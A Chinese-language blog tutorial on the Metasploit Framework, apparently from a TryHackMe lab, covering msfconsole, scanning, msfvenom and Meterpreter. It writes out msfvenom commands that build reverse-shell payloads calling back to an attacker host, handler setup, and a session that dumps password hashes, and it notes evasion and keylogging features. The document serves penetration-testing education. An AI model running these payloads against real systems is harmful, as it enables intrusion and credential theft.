---
layout: post
title:  "Metasploit Framework"
tags: [security]
---

* 目录
{:toc}

## Metasploit介绍

这里说的是Metasploit Framework这一开源版本，一个终端工具。商业版是有图形界面的。

Metasploit Framework集成了多款工具，可实现信息收集、端口扫描、漏洞利用、攻击代码开发、后渗透等多项功能。该框架主要应用于渗透测试领域，同时也适用于漏洞研究与漏洞攻击代码开发工作。

Metasploit Framework 的主要组成部分可归纳如下：

- msfconsole：主命令行交互界面。
- module：包含漏洞利用程序、扫描器、载荷等各类支撑模块。
- tools：可独立运行的工具，用于漏洞研究、漏洞评估或渗透测试。这类工具包括 msfvenom、pattern_create 和 pattern_offset。

## 主要组件

输入msfconsole启动终端控制台。

modules是Metasploit框架内的小型组件，专门用于执行特定任务，例如漏洞利用、目标扫描或暴力破解攻击。

在深入学习模块之前，有必要先厘清几个反复出现的概念：漏洞、利用程序和载荷：

- Exploit：一段可利用目标系统现有安全漏洞的代码。
- Vulnerability：影响目标系统的设计、编码或逻辑缺陷。利用安全漏洞可能导致机密信息泄露，或让攻击者能够在目标系统上执行代码。
- Payload：漏洞利用程序会借助安全漏洞发起攻击。但如果想要让漏洞利用程序达到预期效果（获取目标系统访问权限、读取机密信息等），就需要搭配载荷使用。载荷是将在目标系统上运行的代码。

模块类别：

```
root@ip-10-49-90-189:/opt/metasploit-framework/embedded/framework/modules# ls
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

1. auxiliary（辅助模块）：例如扫描器、爬虫和模糊测试工具，均可在此处找到。
2. encoders（编码器）：编码器可对漏洞利用程序与载荷进行编码，以此规避基于特征码的杀毒软件检测。基于特征码的杀毒及安全解决方案内置已知威胁特征库，通过将可疑文件与特征库进行比对来识别威胁，一旦匹配就会触发告警。因此编码器的规避成功率有限，因为杀毒软件还会执行额外的安全检测。
3. evasion（免杀）：编码器会对有效载荷进行编码，但不应将其视为规避杀毒软件的直接手段。而免杀模块则专门以此为目的进行尝试，效果优劣不一。
4. exploits（漏洞利用）：按目标系统来归类。
5. nops（No OPeration）：不执行任何实际操作。在英特尔 x86 系列 CPU 中，其机器码为 0x90，CPU 执行该指令后会空闲一个时钟周期。这类指令常被用作填充占位，以保证攻击载荷的长度保持一致。
6. payloads：下发各类有效载荷，可在目标系统中创建 Shell 会话。
7. post：在上述渗透测试流程的最后阶段 —— 后渗透利用阶段，将会发挥作用。

载荷类别：

```
root@ip-10-49-90-189:/opt/metasploit-framework/embedded/framework/modules/payloads# ls
adapters  singles  stagers  stages
```

1. adapters：适配器会封装独立载荷（singles），将其转换为不同格式。例如，普通独立载荷可被封装在 PowerShell 适配器中，进而生成一条可执行该载荷的 PowerShell 单行命令。
2. singles：独立有效载荷（添加用户、启动记事本程序等），无需下载额外组件即可运行。
3. stagers：负责建立 Metasploit 与目标系统之间的通信通道，在使用分段载荷（stages）时十分实用。“分段载荷” 会先在目标系统上传一个中继载荷（stagers），随后再下载载荷（stages）的剩余分段内容。这种方式具备一定优势，因为相较于一次性发送完整载荷，分段载荷的初始体积会更小。
4. stages：由stagers下载。这将支持使用更大体积的有效载荷。

Metasploit 有一种巧妙的方式可以区分singles单一（也称为 “内联”）载荷与stages分段载荷。

- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp

二者均为 Windows 反向 Shell。前者是内联（或称单一）载荷，可通过 shell 与 reverse 之间的下划线 “_” 区分；后者则是分段式载荷，可通过 shell 与 reverse 之间的斜杠 “/” 区分。

## msfconsole

msfconsole支持大部分的linux命令，可以当作终端来用。

msfconsole也有自己的命令，支持tab补全，输入help可以查看有哪些命令，也可以输入help set查看set命令的用法。

Msfconsole 采用上下文机制进行管理；这意味着除非将参数设置为全局变量，否则一旦切换所使用的模块，所有参数配置都会失效。在下方示例中，我们调用了 ms17_010_eternalblue 漏洞利用模块，并配置了 RHOSTS 等参数。如果此时切换至其他模块（例如端口扫描器），就需要重新设置 RHOSTS 的值，因为此前所有的配置修改都仅作用于 ms17_010_eternalblue 漏洞利用模块的上下文环境中。

用法示例，可以用search来搜索模块，使用use来切换到对应模块：

```
msf6 > pwd
[*] exec: pwd

/opt/metasploit-framework/embedded/framework/modules/exploits/windows/smb
msf6 > ls -alh | grep ms17_010
[*] exec: ls -alh | grep ms17_010

-rw-r--r--  1 root root  58K Mar 26  2025 ms17_010_eternalblue.rb
-rw-r--r--  1 root root 6.1K Mar 26  2025 ms17_010_psexec.rb
msf6 > search ms17_010_eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1    \_ target: Automatic Target                  .                .        .      .
   2    \_ target: Windows 7                         .                .        .      .
   3    \_ target: Windows Embedded Standard 7       .                .        .      .
   4    \_ target: Windows Server 2008 R2            .                .        .      .
   5    \_ target: Windows 8                         .                .        .      .
   6    \_ target: Windows 8.1                       .                .        .      .
   7    \_ target: Windows Server 2012               .                .        .      .
   8    \_ target: Windows 10 Pro                    .                .        .      .
   9    \_ target: Windows 10 Enterprise Evaluation  .                .        .      .


Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/smb/ms17_010_eternalblue
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 10 Enterprise Evaluation'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

show options可以查看当前上下文可设置的选项，show payloads可以查看可配合使用的载荷。

back命令可以退出当前上下文。info命令可以查看当前上下文详细信息。

`search type:auxiliary telnet`search命令可以设置搜索范围。

使用`set rhosts 10.10.165.39`设置option，常见的一些option：

- RHOSTS：即 “远程主机”，指目标系统的 IP 地址。可设置单个 IP 地址或网段范围。支持无类别域间路由（CIDR）格式（如 / 24、/16 等）以及网段范围格式（10.10.10.x – 10.10.10.y）。也可使用存放目标地址的文件，格式为 file:/path/of/the/target_file.txt，文件中每行填写一个目标地址。
- RPORT：“远程端口”，指目标系统中漏洞应用程序所运行的端口。
- PAYLOAD：漏洞利用过程中将要使用的载荷。
- LHOST：“本地主机”，指攻击机（你的攻击虚拟机或 Kali Linux）的 IP 地址。
- LPORT：“本地端口”，用于反弹回连 shell 的端口。该端口属于你的攻击机，可设置为任意未被其他应用占用的端口。
- SESSION：通过 Metasploit 与目标系统建立的每一条连接都会拥有一个会话 ID。可配合后渗透模块，借助已建立的连接接入目标系统。

`unset`、`unset all`可以清除设置。`setg`、`unsetg`作用于所有上下文。

完成所有模块参数配置后，你可以使用 exploit 命令启动模块。Metasploit 同时支持 run 命令，该命令是 exploit 命令的别名。因为在使用非漏洞利用类模块（如端口扫描器、漏洞扫描器等）时，exploit 一词并不贴切，因此增设了 run 别名。

exploit 命令可以不带任何参数执行，也可以搭配 “-z” 参数使用。

执行 exploit -z 命令会运行漏洞利用程序，并在会话一旦建立后立即将会话转入后台运行。

一旦漏洞被成功利用，就会创建一个会话。该会话是目标系统与 Metasploit 之间建立的通信通道。可以使用 background 命令将会话提示符转入后台，返回至 msfconsole 控制台提示符。

此外，按下 CTRL+Z 组合键也可以将会话转入后台。可在 msfconsole 命令行提示符下或任意环境中使用 `sessions` 命令，查看当前已存在的会话。

若要与任意会话进行交互，可使用 `sessions -i` 命令，后跟目标会话编号。

## 扫描

### 端口扫描

`search portscan`，纯粹的端口扫描msf可能不是首选，但是msf可以调用 Metasploit 的辅助模块进行针对性的“深度扫描”和“服务识别”，为接下来的 Exploit（漏洞利用）做铺垫。

### UDP服务识别

快速识别基于UDP运行的服务。如下所示，该模块不会对所有可能的 UDP 服务进行全面扫描，但能够快速检测域名系统（DNS）、网络基本输入输出系统（NetBIOS）等常见服务。

```
msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.12.229->10.10.12.229 (1 hosts)
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) >
```

### SMB服务扫描

Metasploit 提供了多个实用的辅助模块，可用于扫描特定服务。以下是针对 SMB 服务的相关示例。在企业网络环境中，smb_enumshares 和 smb_version 这两个模块尤为实用，建议花些时间了解你系统所安装的 Metasploit 版本中自带的各类扫描模块。

```
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

### msf db

Metasploit 内置数据库功能，可简化项目管理流程，同时避免在配置参数值时出现混淆问题。

首先你需要启动 PostgreSQL 数据库，Metasploit 将调用该数据库，执行命令如下：systemctl start postgresql。

随后你需要通过 msfdb init 命令初始化 Metasploit 数据库。但如果以 root 身份直接执行 msfdb init，会弹出如下错误提示：“请以非 root 用户身份运行 msfdb”。可以通过 postgres 账户执行命令 sudo -u postgres msfdb init 来解决该问题。

查看数据库状态：

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 >
```

列出工作区：

```
msf6 > workspace
* default
msf6 >
```

添加工作区：

```
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```

切换工作区：

```
msf6 > workspace
default
* tryhackme
msf5 > workspace default
[*] Workspace: default
msf5 > workspace 
tryhackme
* default
msf6 >
```

help命令会显示出db相关的命令：

```
Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_stats          Show statistics for the database
    db_status         Show the current data service status
    hosts             List all hosts in the database
    klist             List Kerberos tickets in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

其中db_nmap用法和nmap一样，但是会把扫描结果存到数据库中。

通过hosts命令和services命令来查询保存的扫描结果。使用`hosts -R`将结果设置为rhosts选项。

`services -S netbios`可以过滤出特定服务。

## 漏洞扫描

Metasploit 可帮助你快速识别一些可被视作唾手可得的高危漏洞。“唾手可得的漏洞” 这一说法，通常指易于发现且容易被利用的安全漏洞，攻击者可借助这类漏洞在目标系统中建立立足点，部分情况下还能获取管理员、超级用户（root）等高权限。
借助 Metasploit 挖掘漏洞，很大程度上依赖于你对目标进行端口扫描与服务指纹识别的能力。你在这两个环节做得越到位，Metasploit 能提供的利用方案就越多。例如，若检测到目标主机运行了 VNC 服务，你可以使用 Metasploit 的搜索功能列出相关可用模块，搜索结果会包含载荷模块和后渗透模块。此时这些结果暂时没有实际利用价值，因为还未找到可直接利用的漏洞攻击代码。但针对 VNC 服务，平台内置了多款扫描模块可供调用。

```
msf6 > search vnc scanner

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/vnc/ard_root_pw         .                normal  No     Apple Remote Desktop Root Vulnerability
   1  auxiliary/scanner/http/thinvnc_traversal  2019-10-16       normal  No     ThinVNC Directory Traversal
   2  auxiliary/scanner/vnc/vnc_none_auth       .                normal  No     VNC Authentication None Detection
   3  auxiliary/scanner/vnc/vnc_login           .                normal  No     VNC Authentication Scanner


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/vnc/vnc_login
```

## Msfvenom

msfvenom并不是在msfconsole上下文中的命令，直接在shell中就可以执行。

Msfvenom 取代了 Msfpayload 和 Msfencode，可用于生成载荷。

Msfvenom 能够调用漏洞利用框架中所有可用的载荷，支持生成多种格式（PHP、可执行程序、动态链接库、可执行链接格式文件等）、适配各类目标系统（苹果系统、Windows、安卓、Linux 等）的载荷文件。

```
msfvenom -l payloads # 列出msf中所有载荷

msfvenom -l formats # 列出 msfvenom 支持的所有输出文件格式，结果分为可执行格式 和 转换格式（代码）

# 生成一个 Windows 64位的可执行文件：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

生成一段 C 语言格式的 Shellcode（用于代码开发）：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
```

### 编码器

与部分认知不同，编码器的目的并非绕过目标系统中已安装的杀毒软件。顾名思义，编码器的作用是对载荷进行编码。虽然编码手段能够对部分杀毒软件起到规避效果，但采用现代混淆技术或基于机器学习的方式注入壳代码，才是解决该问题更优的方案。

下文示例展示了编码的使用方法（通过 -e 参数）：将渗透框架 Meterpreter 的 PHP 版本载荷进行 Base64 编码，输出格式设置为原始格式。

```
msfvenom -l encoders # 列出 Metasploit 框架中所有可用的编码器
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

### 监听器

上面的reverse tcp都是用于建立反弹shell，相应的攻击机需要捕获反弹shell，就需要监听器（handlers）。

这个命令用于连接到攻击机，建立一个反弹shell，生成的代码注释了php标签，需要手动取消注释。

```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```

设置监听：

```
use exploit/multi/handler # 这是 Metasploit 中万能的监听模块
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

当反弹 shell 被触发时，连接将由multi/handler接收，并为我们提供一个命令行 shell。

若载荷被设置为 Meterpreter（例如 Windows 可执行文件格式），multi/handler便会为我们提供一个 Meterpreter 会话 shell。

根据目标系统的配置（操作系统、已安装的网络服务器、已安装的解释器等），msfvenom 几乎可以生成所有格式的载荷。以下是你常会用到的几个示例：在所有这些示例中，LHOST 代表攻击机的 IP 地址，LPORT 代表监听程序所监听的端口。

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

结合后渗透模块使用：

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.49.82.211
lhost => 10.49.82.211
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.49.82.211:4444
[*] Sending stage (1017704 bytes) to 10.49.148.152
[*] Meterpreter session 1 opened (10.49.82.211:4444 -> 10.49.148.152:51260) at 2026-05-11 03:05:07 +0100

meterpreter > hashdump
[-] The "hashdump" command requires the "priv" extension to be loaded (run: `load priv`)
meterpreter > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (x86/linux)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set session 1
session => 1
msf6 post(linux/gather/hashdump) > run
[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20260511030817_default_10.49.148.152_linux.hashes_174584.txt
[*] Post module execution completed
msf6 post(linux/gather/hashdump) >
```

## Meterpreter

### 什么是 Meterpreter？

Meterpreter 是 Metasploit 框架中一个极其先进的、多功能的 Payload（攻击载荷）。

功能：它作为攻击者与目标系统交互的代理（Agent），支持在内存中运行各种复杂指令。

交互性：它不是简单的命令行 Shell，而是一个基于 Command-and-Control (C2) 架构的动态交互式环境。

版本：针对不同的目标系统（Windows, Linux, Android 等）有不同的版本，功能各异。

### 工作原理：为何它如此隐蔽？

Meterpreter 的设计核心是 Stealth（隐蔽性），其主要特征包括：

1. 内存运行（In-Memory）：

Meterpreter 运行在目标系统的内存（RAM）中，不写入磁盘。

优势：可以有效避开杀毒软件对新生成文件、磁盘扫描的检测。如果系统中没有文件落地，传统防病毒工具很难发现它。

2. 进程注入：

它通常以现有进程的形式存在，而没有独立的可执行文件（如 meterpreter.exe）。

3. 加密通信：

使用 TLS（加密传输） 建立与攻击者机器的通信隧道。

优势：由于流量已加密，网络层的 IPS（入侵防御系统）和 IDS（入侵检测系统）在不进行 SSL/HTTPS 解密的情况下，无法识别其恶意活动。

```
meterpreter > getpid
Current pid: 2462

meterpreter > ps

Process List
============

 PID   PPID  Name                            Arch    User              Path
 ---   ----  ----                            ----    ----              ----
 1     0     systemd                         x86_64  root              /lib/systemd/systemd
 2462  2440  rev_shell.elf                   x86     root              /rev_shell.elf
```

虽然 Meterpreter 极力隐藏，但现代的高级终端安全解决方案（如 EDR）仍能通过行为分析（如异常的 API 调用或内存特征）发现它。

### Flavors

meterpreter作为payload也是分single和stage两种的。

```
msfvenom --list payloads | grep meterpreter
```

支持多种平台：

- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

选择使用哪个版本的 Meterpreter，主要取决于三个因素：

1. 目标操作系统（目标操作系统是 Linux 还是 Windows？是否为苹果 Mac 设备？是否为安卓手机？等等）
2. 目标系统上可用的组件（是否安装了 Python？是否为 PHP 网站？等等）
3. 你能与目标系统建立的网络连接类型（是否允许原始 TCP 连接？是否只能建立 HTTPS 反向连接？IPv6 地址的监控力度是否不如 IPv4 地址严格？等等）

部分exploit模块，也会自带默认的 Meterpreter 载荷，比如ms17_010_eternalblue。

### Commands

Meterpreter 的每个版本都拥有不同的命令选项，因此执行help命令始终是个好选择。命令是 Meterpreter 内置的工具，可在目标系统上直接运行，无需加载任何额外脚本或可执行文件。

尽管所有这些命令看似都能在帮助菜单中找到，但并非全部都能正常运行。例如，目标系统可能未配备摄像头，或是运行在没有完整桌面环境的虚拟机中。


| 命令 | 说明 |
| :--- | :--- |
| `background` | **[核心]** 将当前会话切换至后台 |
| `exit` | **[核心]** 终止 Meterpreter 会话 |
| `guid` | **[核心]** 获取会话的全局唯一标识符 |
| `help` | **[核心]** 显示帮助菜单 |
| `info` | **[核心]** 显示关于 Post 模块的信息 |
| `irb` | **[核心]** 在当前会话中开启交互式 Ruby shell |
| `load` | **[核心]** 加载一个或多个 Meterpreter 扩展 |
| `migrate` | **[核心]** 将 Meterpreter 迁移至另一个进程 |
| `run` | **[核心]** 执行一个 Meterpreter 脚本或 Post 模块 |
| `sessions` | **[核心]** 快速切换至另一个会话 |
| `cd` | **[文件系统]** 切换目录 |
| `ls` | **[文件系统]** 列出当前目录下的文件（也可使用 dir） |
| `pwd` | **[文件系统]** 打印当前工作目录 |
| `edit` | **[文件系统]** 编辑文件 |
| `cat` | **[文件系统]** 将文件内容输出到屏幕 |
| `rm` | **[文件系统]** 删除指定文件 |
| `search` | **[文件系统]** 搜索文件 |
| `upload` | **[文件系统]** 上传文件或目录 |
| `download` | **[文件系统]** 下载文件或目录 |
| `arp` | **[网络]** 显示主机 ARP 缓存 |
| `ifconfig` | **[网络]** 显示目标系统的网络接口 |
| `netstat` | **[网络]** 显示网络连接状态 |
| `portfwd` | **[网络]** 转发本地端口至远程服务 |
| `route` | **[网络]** 查看并修改路由表 |
| `clearev` | **[系统]** 清除事件日志 |
| `execute` | **[系统]** 执行命令 |
| `getpid` | **[系统]** 显示当前进程标识符 (PID) |
| `getuid` | **[系统]** 显示运行 Meterpreter 的用户 |
| `kill` | **[系统]** 终止一个进程 |
| `pgrep` | **[系统]** 通过名称查找进程 |
| `ps` | **[系统]** 列出运行中的进程 |
| `reboot` | **[系统]** 重启远程计算机 |
| `shell` | **[系统]** 进入系统命令 shell |
| `shutdown` | **[系统]** 关闭远程计算机 |
| `sysinfo` | **[系统]** 获取远程系统信息（如 OS） |
| `idletime` | **[其他]** 返回远程用户空闲的秒数 |
| `keyscan_dump` | **[其他]** 转储按键记录缓冲区 |
| `keyscan_start` | **[其他]** 开始捕获按键记录 |
| `keyscan_stop` | **[其他]** 停止捕获按键记录 |
| `screenshare` | **[其他]** 实时查看远程用户的桌面 |
| `screenshot` | **[其他]** 截取交互式桌面的屏幕截图 |
| `record_mic` | **[其他]** 从默认麦克风录音 X 秒 |
| `webcam_chat` | **[其他]** 开启视频聊天 |
| `webcam_list` | **[其他]** 列出摄像头列表 |
| `webcam_snap` | **[其他]** 通过指定的摄像头拍摄快照 |
| `webcam_stream` | **[其他]** 播放指定摄像头的视频流 |
| `getsystem` | **[其他]** 尝试将权限提升至本地系统权限 |
| `hashdump` | **[其他]** 导出 SAM 数据库的内容 |

#### 常用命令

getuid 命令会显示 Meterpreter 当前运行所依托的用户身份。该命令可让你了解自己在目标系统中拥有的权限级别（例如：你是否为 NT AUTHORITY\SYSTEM 这类管理员级用户，还是普通用户？）

ps 命令会列出正在运行的进程。PID 列还会提供进程 ID 信息，你可以利用该信息将 Meterpreter 迁移到其他进程中。

##### migrate

若要迁移到任意进程，只需输入 migrate 命令，后跟目标进程的进程标识符（PID）。迁移至其他进程有助于 Meterpreter 与其进行交互。例如，若发现目标主机上正在运行文字处理程序（如 word.exe、notepad.exe 等），你可以迁移到该进程，并开始捕获用户向此进程输入的击键记录。部分 Meterpreter 版本提供了 keyscan_start、keyscan_stop 和 keyscan_dump 命令选项，可让 Meterpreter 实现键盘记录器的功能。迁移至其他进程还有助于维持更稳定的 Meterpreter 会话。

请注意：若从高权限用户（例如系统账户）迁移至低权限用户（例如网络服务器账户）启动的进程，可能会丢失用户权限，且大概率无法恢复这些权限。

##### hashdump

hashdump 命令：用于列出 Windows 系统SAM 数据库内容。

SAM 数据库：Security Account Manager，Windows 系统存储用户密码的核心组件。

密码存储格式：以 NTLM（New Technology LAN Manager） 格式保存。

从数学原理上来说，无法破解这些哈希值，但你仍可借助在线 NTLM 数据库或彩虹表攻击获取明文密码。这些哈希值还可用于哈希传递攻击，在同一网络中对这些用户可访问的其他系统完成身份认证。

##### search

search 命令可用于查找可能包含关键敏感信息的文件。在 CTF 夺旗竞赛场景中，可利用该命令快速找到旗帜文件或证明文件；而在真实的渗透测试项目中，你可能需要检索用户自建文件或配置文件，这类文件往往存有密码或账号相关信息。

```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```

##### shell

该 shell 命令会在目标系统中启动常规命令行终端。按下 CTRL+Z 组合键可返回 Meterpreter 终端。

```
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```